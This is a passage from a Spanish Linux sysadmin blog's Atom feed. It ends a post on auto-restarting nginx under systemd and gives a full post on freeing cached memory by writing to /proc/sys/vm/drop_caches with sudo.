root       &lt;span class="m"&gt;787&lt;/span&gt;  &lt;span class="m"&gt;0&lt;/span&gt;.0  &lt;span class="m"&gt;0&lt;/span&gt;.9   &lt;span class="m"&gt;4556&lt;/span&gt;  &lt;span class="m"&gt;2280&lt;/span&gt; pts/0    S+   &lt;span class="m"&gt;11&lt;/span&gt;:56   &lt;span class="m"&gt;0&lt;/span&gt;:00          &lt;span class="se"&gt;\_&lt;/span&gt; grep nginx
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora solo hay que esperar el paso de los segundos configurados, y volver a ver si el servicio está corriendo; aunque en este esperé algo menos de lo configurado; la paciencia no es una de mis virtudes...&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# ps faux &lt;span class="p"&gt;|&lt;/span&gt; grep nginx
root       &lt;span class="m"&gt;789&lt;/span&gt;  &lt;span class="m"&gt;0&lt;/span&gt;.0  &lt;span class="m"&gt;0&lt;/span&gt;.8   &lt;span class="m"&gt;4556&lt;/span&gt;  &lt;span class="m"&gt;2192&lt;/span&gt; pts/0    S+   &lt;span class="m"&gt;11&lt;/span&gt;:56   &lt;span class="m"&gt;0&lt;/span&gt;:00          &lt;span class="se"&gt;\_&lt;/span&gt; grep nginx
root@server:~# ps faux &lt;span class="p"&gt;|&lt;/span&gt; grep nginx
root       &lt;span class="m"&gt;791&lt;/span&gt;  &lt;span class="m"&gt;0&lt;/span&gt;.0  &lt;span class="m"&gt;0&lt;/span&gt;.9   &lt;span class="m"&gt;4556&lt;/span&gt;  &lt;span class="m"&gt;2280&lt;/span&gt; pts/0    S+   &lt;span class="m"&gt;11&lt;/span&gt;:56   &lt;span class="m"&gt;0&lt;/span&gt;:00          &lt;span class="se"&gt;\_&lt;/span&gt; grep nginx
root@server:~# ps faux &lt;span class="p"&gt;|&lt;/span&gt; grep nginx
root       &lt;span class="m"&gt;802&lt;/span&gt;  &lt;span class="m"&gt;0&lt;/span&gt;.0  &lt;span class="m"&gt;0&lt;/span&gt;.8   &lt;span class="m"&gt;4556&lt;/span&gt;  &lt;span class="m"&gt;2236&lt;/span&gt; pts/0    S+   &lt;span class="m"&gt;11&lt;/span&gt;:56   &lt;span class="m"&gt;0&lt;/span&gt;:00          &lt;span class="se"&gt;\_&lt;/span&gt; grep nginx
root       &lt;span class="m"&gt;796&lt;/span&gt;  &lt;span class="m"&gt;0&lt;/span&gt;.0  &lt;span class="m"&gt;0&lt;/span&gt;.7   &lt;span class="m"&gt;6356&lt;/span&gt;  &lt;span class="m"&gt;1932&lt;/span&gt; ?        Ss   &lt;span class="m"&gt;11&lt;/span&gt;:56   &lt;span class="m"&gt;0&lt;/span&gt;:00 nginx: master process /usr/sbin/nginx -g daemon on&lt;span class="p"&gt;;&lt;/span&gt; master_process on&lt;span class="p"&gt;;&lt;/span&gt;
www-data   &lt;span class="m"&gt;797&lt;/span&gt;  &lt;span class="m"&gt;0&lt;/span&gt;.0  &lt;span class="m"&gt;1&lt;/span&gt;.0   &lt;span class="m"&gt;6504&lt;/span&gt;  &lt;span class="m"&gt;2592&lt;/span&gt; ?        S    &lt;span class="m"&gt;11&lt;/span&gt;:56   &lt;span class="m"&gt;0&lt;/span&gt;:00  &lt;span class="se"&gt;\_&lt;/span&gt; nginx: worker process                           
www-data   &lt;span class="m"&gt;798&lt;/span&gt;  &lt;span class="m"&gt;0&lt;/span&gt;.0  &lt;span class="m"&gt;1&lt;/span&gt;.0   &lt;span class="m"&gt;6504&lt;/span&gt;  &lt;span class="m"&gt;2592&lt;/span&gt; ?        S    &lt;span class="m"&gt;11&lt;/span&gt;:56   &lt;span class="m"&gt;0&lt;/span&gt;:00  &lt;span class="se"&gt;\_&lt;/span&gt; nginx: worker process                           
www-data   &lt;span class="m"&gt;799&lt;/span&gt;  &lt;span class="m"&gt;0&lt;/span&gt;.0  &lt;span class="m"&gt;1&lt;/span&gt;.0   &lt;span class="m"&gt;6504&lt;/span&gt;  &lt;span class="m"&gt;2592&lt;/span&gt; ?        S    &lt;span class="m"&gt;11&lt;/span&gt;:56   &lt;span class="m"&gt;0&lt;/span&gt;:00  &lt;span class="se"&gt;\_&lt;/span&gt; nginx: worker process                           
www-data   &lt;span class="m"&gt;800&lt;/span&gt;  &lt;span class="m"&gt;0&lt;/span&gt;.0  &lt;span class="m"&gt;1&lt;/span&gt;.0   &lt;span class="m"&gt;6504&lt;/span&gt;  &lt;span class="m"&gt;2532&lt;/span&gt; ?        S    &lt;span class="m"&gt;11&lt;/span&gt;:56   &lt;span class="m"&gt;0&lt;/span&gt;:00  &lt;span class="se"&gt;\_&lt;/span&gt; nginx: worker process                           
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto tenemos nuestro &lt;strong&gt;autorestart&lt;/strong&gt; para este servicio.&lt;/p&gt;</content><category term="linux"></category><category term="debian"></category><category term="jessie"></category><category term="systemd"></category><category term="nginx"></category></entry><entry><title>Liberando memoria caché</title><link href="https://www.linuxsysadmin.ml/2015/11/liberando-memoria-cache.html" rel="alternate"></link><published>2015-11-02T14:00:00+01:00</published><updated>2015-11-02T14:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2015-11-02:/2015/11/liberando-memoria-cache.html</id><summary type="html">&lt;p&gt;A veces nos encontramos que nuestro sistema linux parece tener la memoria &lt;em&gt;virtual&lt;/em&gt; ocupada, cuando no tenemos nada de memoria &lt;em&gt;RSS&lt;/em&gt;; esto no es un problema, ya que por la forma de funcionar del &lt;em&gt;memory manager&lt;/em&gt; de linux, se conserva "por si acaso" y se libera cuando realmente se necesita …&lt;/p&gt;</summary><content type="html">&lt;p&gt;A veces nos encontramos que nuestro sistema linux parece tener la memoria &lt;em&gt;virtual&lt;/em&gt; ocupada, cuando no tenemos nada de memoria &lt;em&gt;RSS&lt;/em&gt;; esto no es un problema, ya que por la forma de funcionar del &lt;em&gt;memory manager&lt;/em&gt; de linux, se conserva "por si acaso" y se libera cuando realmente se necesita.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@desktop:~$ free -m
             total       used       free     shared    buffers     cached
Mem:          &lt;span class="m"&gt;3858&lt;/span&gt;       &lt;span class="m"&gt;3226&lt;/span&gt;        &lt;span class="m"&gt;632&lt;/span&gt;          &lt;span class="m"&gt;0&lt;/span&gt;        &lt;span class="m"&gt;114&lt;/span&gt;       &lt;span class="m"&gt;2545&lt;/span&gt;
-/+ buffers/cache:        &lt;span class="m"&gt;566&lt;/span&gt;       &lt;span class="m"&gt;3291&lt;/span&gt;
Swap:         &lt;span class="m"&gt;2381&lt;/span&gt;          &lt;span class="m"&gt;0&lt;/span&gt;       &lt;span class="m"&gt;2381&lt;/span&gt;
gerard@desktop:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Sin embargo este detalle nos puede resultar molesto y puede que queramos &lt;strong&gt;liberar&lt;/strong&gt; esa memoria de verdad, por ejemplo, para comparar memoria real ocupada por el sistema o sencillamente porque así lo queremos.&lt;/p&gt;
&lt;p&gt;En este caso no tenemos mas remedio que solicitar el &lt;em&gt;memory manager&lt;/em&gt; que la libere, escribiendo en el fichero de control habilitado para ello, de acuerdo a la &lt;a href="https://www.kernel.org/doc/Documentation/sysctl/vm.txt"&gt;documentación del &lt;em&gt;kernel&lt;/em&gt; de linux&lt;/a&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;drop_caches

Writing to this will cause the kernel to drop clean caches, as well as
reclaimable slab objects like dentries and inodes.  Once dropped, their
memory becomes free.

To free pagecache:
    &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt; &amp;gt; /proc/sys/vm/drop_caches
To free reclaimable slab objects &lt;span class="o"&gt;(&lt;/span&gt;includes dentries and inodes&lt;span class="o"&gt;)&lt;/span&gt;:
    &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="m"&gt;2&lt;/span&gt; &amp;gt; /proc/sys/vm/drop_caches
To free slab objects and pagecache:
    &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="m"&gt;3&lt;/span&gt; &amp;gt; /proc/sys/vm/drop_caches

This is a non-destructive operation and will not free any dirty objects.
To increase the number of objects freed by this operation, the user may run
&lt;span class="sb"&gt;`&lt;/span&gt;sync&lt;span class="err"&gt;&amp;#39;&lt;/span&gt; prior to writing to /proc/sys/vm/drop_caches.  This will minimize the
number of dirty objects on the system and create more candidates to be
dropped.
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Este fichero viene por defecto con permisos de escritura solamente para el usuario &lt;strong&gt;root&lt;/strong&gt; y no se puede escribir sin el mismo. Como no queremos trabajar con el usuario &lt;strong&gt;root&lt;/strong&gt;, vamos a usar el comando &lt;em&gt;sudo&lt;/em&gt; con un usuario normal:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@desktop:~$ sudo bash -c &lt;span class="s2"&gt;&amp;quot;echo 3 &amp;gt; /proc/sys/vm/drop_caches&amp;quot;&lt;/span&gt;
gerard@desktop:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Alternativamente, podemos utilizar el comando &lt;em&gt;tee&lt;/em&gt; para realizar la misma operación, sin el envoltorio de &lt;em&gt;bash&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@desktop:~$ &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="m"&gt;3&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; sudo tee /proc/sys/vm/drop_caches
&lt;span class="m"&gt;3&lt;/span&gt;
gerard@desktop:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y finalmente nuestra memoria queda vacía de todo aquello que no era indispensable para la ejecución del sistema.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@desktop:~$ free -m
             total       used       free     shared    buffers     cached
Mem:          &lt;span class="m"&gt;3858&lt;/span&gt;        &lt;span class="m"&gt;752&lt;/span&gt;       &lt;span class="m"&gt;3105&lt;/span&gt;          &lt;span class="m"&gt;0&lt;/span&gt;          &lt;span class="m"&gt;2&lt;/span&gt;        &lt;span class="m"&gt;207&lt;/span&gt;
-/+ buffers/cache:        &lt;span class="m"&gt;542&lt;/span&gt;       &lt;span class="m"&gt;3315&lt;/span&gt;
Swap:         &lt;span class="m"&gt;2381&lt;/span&gt;          &lt;span class="m"&gt;0&lt;/span&gt;       &lt;span class="m"&gt;2381&lt;/span&gt;
gerard@desktop:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;¡Acabamos de liberar 2 gigabytes de memoria!&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;CUIDADO&lt;/strong&gt;: Esta operación puede afectar el rendimiento puntual del sistema, ya que en caso de volver a necesitar la información &lt;em&gt;cacheada&lt;/em&gt;, deberá volver a recargar la memoria, probablemente desde disco.&lt;/p&gt;</content><category term="linux"></category><category term="kernel"></category><category term="memory manager"></category><category term="drop caches"></category></entry></feed>